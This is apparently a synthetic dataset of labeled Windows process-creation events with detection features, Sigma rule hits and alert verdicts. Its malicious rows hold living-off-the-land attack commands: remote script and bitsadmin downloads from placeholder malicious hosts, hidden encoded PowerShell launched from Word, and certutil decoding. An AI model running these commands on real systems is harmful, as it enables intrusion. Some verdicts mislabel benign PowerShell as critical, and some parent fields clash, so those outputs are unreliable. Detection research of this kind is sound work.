UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-03T13:45:48.424Z,{9CF64C98-65C3-4D34-87F8-C82D38CFF6F5},24635,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,42251,CORP\admin,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,13,0,0,45,3.9031,1.575697663509122,1.3977339161267168,0,3,2,False,None,none,,72.5951068836082,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.7,"ANOMALY SCORE: 73/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-02T12:35:24.316Z,{17ABD12C-39CC-4316-87F7-DC1D19E05415},42874,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://shadow-net355.com/script679.js,C:\Windows\System32\cmd.exe,cmd.exe /c,63815,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,61,4.439,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,12,0,0,35,3.9031,0.9742863415590755,0.907645882771003,0,9,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.26008575428897,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 75
2024-07-01T11:57:56.468Z,{83A2B14B-29F9-4461-9FD5-25B2EE357C33},6721,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\System32\cmd.exe,explorer.exe,6254,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,77,4.9254,1,0,0,0,3,0.3333,0,0,2,0,0,1,606078729,11,0,0,57,3.9031,1.6157917516391251,1.6359649155367193,0,0,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,94.86174491210221,55,cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +5 suspicious flags],True,ALERT,CRITICAL,99.5,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 95 | Chain Risk: 55
2024-07-04T01:29:38.753Z,{F33FD691-42F6-42EB-A860-9415F15A6D11},21447,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2326 /download http://exploit-kit2035.ru/files/svc533.exe C:\Users\Public\loader781.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,46026,CORP\jsmith,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,114,4.9245,1,1,0,0,6,0.1667,0,1,2,0,0,1,1514001697,1,1,0,29,3.9031,3.09927301244924,1.634617285747474,0,9,1,True,BITSAdmin File Download,high,attack.t1197,89.83832546677398,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 90
2024-07-01T02:49:51.320Z,{EAA699C6-E43A-419F-A6CF-37B4FD1C8967},22580,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn9364.net/script849.js,C:\Windows\System32\cmd.exe,cmd.exe /c,55547,CORP\mjones,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,63,4.4497,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,2,1,0,49,3.9031,1.0544745178190815,0.9236677035987026,0,0,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,92.4867158584756,85,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 85
2024-07-04T20:28:30.894Z,{936B3E97-3723-476A-84F3-B79C2F37DA2C},49180,C:\Windows\System32\certutil.exe,certutil.exe -decode C:\Users\Public\encoded9534.txt C:\Users\Public\decoded1447.exe,C:\Windows\System32\cmd.exe,powershell.exe,9749,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,84,4.3974,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,20,0,0,28,3.9031,1.896450368549147,0.8453554391791984,0,12,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,90.61933846908593,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,ALERT,CRITICAL,99.1,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 91 | Chain Risk: 50
2024-07-01T16:43:57.053Z,{267F65F7-2DB5-42E0-A129-E6EA5FB83D86},12753,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,15626,CORP\admin,High,0,,,benign,1,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,16,0,0,43,1.3846,1.976638544809153,0.836221503940977,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,48.66108933820465,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-02T13:15:26.937Z,{C6E9DCF4-45B9-4ABD-94BD-F5FD0BAE3819},48204,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,21967,CORP\mjones,Medium,0,,,benign,1,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,13,0,0,15,1.3846,2.7785203074092153,1.294116158998041,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,51.969696951646014,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 52 | Chain Risk: 5
2024-07-01T10:19:26.694Z,{75015D30-5698-487E-B30F-0B70943D3AF9},12088,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""DiskCleanup"" /tr ""cleanmgr /sagerun:1"" /sc weekly /d MON",C:\Windows\System32\cmd.exe,cmd.exe,4860,CORP\sysadmin,High,0,,,gray_area,1,15,0,0,82,4.4321,0,0,0,0,11,0.0,0,0,2,0,0,1,200102300,10,0,0,19,3.9031,1.8162621922891407,0.8973140543867855,0,10,2,False,None,none,,71.77488843146895,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,ALERT,MEDIUM,51.2,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 11.00 (baseline: 3.17±2.29, z=3.4); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T08:13:30.079Z,{2E19C69E-76FC-4B62-B98D-764E83D64F6B},9696,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39907,CORP\jsmith,Medium,0,,,benign,0,3,1,1,98,4.7762,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,8,0,0,13,1.231,2.4577676023691906,1.4125578438084203,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.233702460566676,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-04T16:13:27.104Z,{9408AAD7-0016-41F9-A119-83E9E5C7261E},49233,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,55399,CORP\itops,High,0,,,benign,0,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,16,0,0,13,1.231,2.7785203074092153,1.294116158998041,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,46.01949664002123,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 46 | Chain Risk: 5
2024-07-02T02:48:19.864Z,{207484A9-3281-473A-B346-8E5349B5AAEB},29533,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\driver745.csproj,C:\Windows\System32\cmd.exe,cmd.exe,27886,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,84,4.9209,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,2,1,0,48,3.9031,1.896450368549147,1.62922676659049,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.27412849376216,75,cmd.exe → msbuild.exe: Command shell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 75
2024-07-02T20:10:03.279Z,{AA3E9119-15C5-43EF-9526-48D17C98112A},24669,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document41.docm",28493,CORP\klee,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,234,4.7862,1,0,0,1,8,0.375,1,0,2,1,0,0,1182374401,20,0,0,10,3.9031,7.910563588049614,1.427531508133373,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-01T16:36:00.624Z,{9D473E3B-57F3-439E-A2A4-B3B94AFB089C},43599,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11755,CORP\sysadmin,High,0,,,benign,0,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,16,0,0,36,1.231,1.4554153991191128,0.7838136788036412,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.99951116544086,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-04T09:06:50.625Z,{86F0E934-9615-426B-ADAC-425195A5882B},40954,C:\Windows\System32\rundll32.exe,"rundll32.exe printui.dll,PrintUIEntry /in /n \\printserver\HP_LaserJet",C:\Windows\explorer.exe,C:\Windows\explorer.exe,52259,CORP\itops,Medium,0,,,gray_area,0,1,1,0,70,4.4559,0,0,0,0,5,0.0,0,0,1,0,0,0,788896773,9,0,0,6,3.9031,1.3351331347291033,0.9329513754801732,0,5,1,False,None,none,,78.5081390954135,25,explorer.exe → rundll32.exe: Explorer launching rundll32,True,ALERT,MEDIUM,55.7,"ANOMALY SCORE: 79/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4)"
2024-07-01T15:50:01.056Z,{2ACFE613-C9D9-4C7E-A511-ED248561CBD9},57333,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://c2-server487.top/script285.js,C:\Windows\System32\cmd.exe,cmd.exe /c,59753,CORP\agarwal,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,60,4.2224,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,15,0,0,50,3.9031,0.9341922534290723,0.5833163134925202,0,12,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.34710165253951,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 75
2024-07-04T03:59:52.774Z,{970F8CAE-D608-4AAC-A1F6-520EDB5DDCDA},16431,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host5955.net/script243.js,C:\Windows\System32\cmd.exe,cmd.exe /c,20491,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,62,4.2219,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,3,1,0,59,3.9031,1.0143804296890786,0.5825676302762717,0,6,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,92.41397516328065,85,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 85
2024-07-05T10:31:18.143Z,{48C4D452-8DA2-49E8-A290-5B15DDD91692},13261,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,21616,CORP\mjones,Medium,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,10,0,0,31,1.231,2.5780498667591996,1.4642169857295075,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,39.837925008037345,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 40 | Chain Risk: 5
2024-07-03T02:46:58.944Z,{DAC798CA-F33D-4ABD-91E7-A738844BC621},29973,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,23196,CORP\mjones,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,223,4.7102,1,0,0,1,6,0.5,1,0,2,1,0,0,3072976960,2,1,0,46,3.9031,7.46952861861958,1.3137316592637303,0,0,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-01T10:19:00.971Z,{052FEF7A-928A-4BAF-93ED-B91353A273DB},26932,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,22772,CORP\sysadmin,High,0,,,benign,1,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,10,0,0,19,1.3846,2.0568267210691595,1.0489972739985602,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,51.899746495942566,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 52 | Chain Risk: 5
2024-07-03T13:08:24.881Z,{210F7484-673A-46C6-9A56-2F995D734255},55982,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,38249,CORP\admin,High,0,,,benign,0,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,13,0,0,8,1.231,2.0568267210691595,1.0489972739985602,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.780974825849896,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
